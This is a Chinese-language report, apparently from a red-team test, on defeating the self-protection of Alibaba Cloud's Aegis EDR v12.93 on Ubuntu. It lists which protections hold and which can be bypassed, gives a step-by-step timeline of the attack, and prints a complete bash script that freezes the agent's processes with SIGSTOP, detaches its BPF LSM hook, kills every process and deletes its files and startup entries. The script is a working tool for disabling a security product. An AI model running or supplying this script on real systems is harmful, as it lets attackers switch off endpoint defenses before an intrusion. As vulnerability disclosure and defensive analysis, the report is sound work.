# 阿里云 Aegis EDR v12.93 自保护攻破报告

> 靶机: <ALIBABA_CLOUD_ECS> / Ubuntu 24.04 / Kernel 6.8.0-124-generic
> 攻击时间: 2026-06-26 10:40~10:55
> 攻击者: root
> 关联: [架构分析](./01-architecture-analysis.md)

---

## 1. 攻击结果

```
┌──────────────────────────────────────────────────────┐
│  Aegis v12.93 自保护: 已完全攻破                       │
│                                                       │
│  进程状态:  6/6 全部杀死 (含子进程 AliHips/AliNet 等)    │
│  BPF 防护:  LSM fmod_ret (prog 387) 已卸载             │
│  文件残留:  /usr/local/aegis 已清空                     │
│  自动恢复:  60s 内无任何进程/BPF 程序复活               │
│  启动机制:  无 cron/systemd/rc 残留                     │
└──────────────────────────────────────────────────────┘
```

## 2. 自保护实际效果

### 2.1 生效的保护

| 维度 | 机制 | 效果 |
|------|------|:---:|
| kill -9/-15/-1/-2 | `fmod_ret/security_task_kill` | `Operation not permitted` |
| pidfd_send_signal(SIGKILL) | 同上 LSM hook | 阻断 |
| TC 网络过滤 | `tc_alisecnet_ingress/egress` | 存在 (未深入测试) |

### 2.2 可绕过的保护

| 维度 | 声明机制 | 实际 |
|------|---------|:---:|
| SIGSTOP 冻结 | 无专门机制 | **可冻结** |
| ptrace 附加 | `trace_ptrace_enter` | **检测不阻断** |
| /proc/PID/mem 读取 | — | **可读** |
| 文件删除 (unlink) | `kprobe_vfs_unlink` + fanotify | **可删除** |
| 目录重命名 | fanotify | **可 mv** |
| 配置文件覆写 | fanotify | **可篡改** |
| OOM 优先级篡改 | — | **可改** |
| cgroup freezer | — | **可冻结** |
| BPF pin 操作 | `security_bpf_prog` | **检测不阻断** |

---

## 3. 攻击时间线

```
T-05:00  部署 v12.93 → 确认 6 进程 + 71 BPF 探针 + modret_security_task_kill

────────────── 阶段 1: 直接信号 — 全部阻断 ──────────────
T+00:00  kill -9  AliYunDun           → BLOCKED
T+00:01  kill -9  AliYunDunMonitor    → BLOCKED
T+00:01  kill -9  AliYunDunUpdate     → BLOCKED
T+00:02  kill -15 AliYunDun           → BLOCKED
T+00:02  kill -2  AliYunDun           → 信号发出, 进程忽略

────────────── 阶段 2: SIGSTOP 绕过 — 成功 ──────────────
T+00:03  kill -19 AliYunDun           → ★ SUCCESS 进程冻结 (State: T)

────────────── 阶段 3: ptrace/内存 — 检测不阻断 ──────────────
T+00:04  ptrace(PTRACE_ATTACH)        → ★ SUCCESS 附加成功
T+00:05  /proc/PID/mem read           → ★ SUCCESS 读出 ELF 头
T+00:05  process_vm_writev            → 返回 -1 (未完全成功)

────────────── 阶段 4: 文件系统 — 完全无保护 ──────────────
T+00:06  rm AliYunDunUpdate 二进制    → ★ SUCCESS
T+00:06  rm AliYunDun 二进制          → ★ SUCCESS
T+00:06  覆写 hook_config → "disable" → ★ SUCCESS
T+00:07  mv aegis_client 目录         → ★ SUCCESS (exe 变 deleted)

────────────── 阶段 5: 系统级操作 ──────────────
T+00:08  echo 1000 > oom_score_adj    → ★ SUCCESS
T+00:08  cgroup freezer freeze        → ★ SUCCESS
T+00:08  pidfd_send_signal(SIGKILL)   → BLOCKED (LSM 仍生效)

────────────── 阶段 6: BPF 链接突破 (关键) ──────────────
T+00:09  bpftool pin id 387           → pin 成功
T+00:10  bpftool link detach id 111   → 解绑 fmod_ret LSM hook
         prog 387 (modret_security_task_kill) 卸载

────────────── 阶段 7: 斩杀 (6/6) ──────────────
T+00:11  kill -9 AliYunDun            → ★ KILLED
T+00:11  kill -9 AliYunDunMonitor     → ★ KILLED
T+00:11  kill -9 AliYunDunUpdate      → ★ KILLED
T+00:11  kill -9 AliHips              → ★ KILLED (已是 zombie)
T+00:11  kill -9 AliNet               → ★ KILLED
T+00:11  kill -9 AliSecCheck          → ★ KILLED

────────────── 阶段 8: 清理 & 验证 ──────────────
T+00:12  rm -rf /usr/local/aegis/*    → 文件清空
T+01:00  60s 等待                      → 无进程复活
         检查 cron/systemd/rc          → 无启动项残留
         检查 BPF 程序                 → 16 (仅 systemd cgroup)
```

---

## 4. 攻击 payload

```bash
#!/bin/bash
# Aegis v12.93 完整斩杀脚本

# Step 1: 冻结所有进程 (绕过 security_task_kill)
for pid in $(pgrep -f "AliYun|AliHips|AliNet|AliSec"); do
    kill -19 $pid 2>/dev/null
done
sleep 1

# Step 2: 解除 LSM fmod_ret 链接
LINK_ID=$(bpftool link list 2>/dev/null | grep -B1 "security_task_kill" | grep -oP '^\d+')
[ -n "$LINK_ID" ] && bpftool link detach id $LINK_ID 2>/dev/null
sleep 1

# Step 3: 斩杀所有进程
for pid in $(pgrep -f "AliYun|AliHips|AliNet|AliSec"); do
    kill -9 $pid 2>/dev/null
done
sleep 2

# Step 4: 清理孤儿 BPF 程序
for id in $(bpftool link list 2>/dev/null | grep -A1 "prog " | grep -oP "prog\s+\K\d+" | sort -u); do
    bpftool link detach id $(bpftool link list 2>/dev/null | grep -B1 "prog $id" | grep -oP '^\d+') 2>/dev/null
done

# Step 5: 清理文件
rm -rf /usr/local/aegis/* 2>/dev/null

# Step 6: 清理启动项
rm -f /etc/init.d/aegis /etc/rc*.d/*aegis*
crontab -l 2>/dev/null | grep -v aegis | crontab - 2>/dev/null

echo "Aegis neutralized."
```

---

## 5. 漏洞分析

### 5.1 关键漏洞

| # | 漏洞 | 严重性 | 根因 |
|---|------|:---:|------|
| V1 | **SIGSTOP 绕过进程保护** | 🔴 Critical | `security_task_kill` 不覆盖非终止信号 |
| V2 | **root 可解除 BPF 链接** | 🔴 Critical | `security_bpf*` 探针仅检测不阻断 |
| V3 | **文件无真实保护** | 🟠 High | kprobe 检测但 fanotify 未激活 |
| V4 | **ptrace 可附加** | 🟠 High | tracepoint 仅检测不阻断 |
| V5 | **OOM/配篡改** | 🟡 Medium | oom_score_adj 无保护 |

### 5.2 设计缺陷

| # | 缺陷 |
|---|------|
| D1 | **单点防护**: 自保护完全依赖 1 个 BPF program |
| D2 | **检测 ≠ 阻断**: 大量探针仅遥测，不做 enforcement |
| D3 | **root 无特区对待**: 不区分管理员和攻击者 |
| D4 | **子进程无独立保护**: fork 出的子进程继承父进程保护，但父进程死后的孤儿进程失去监控 |
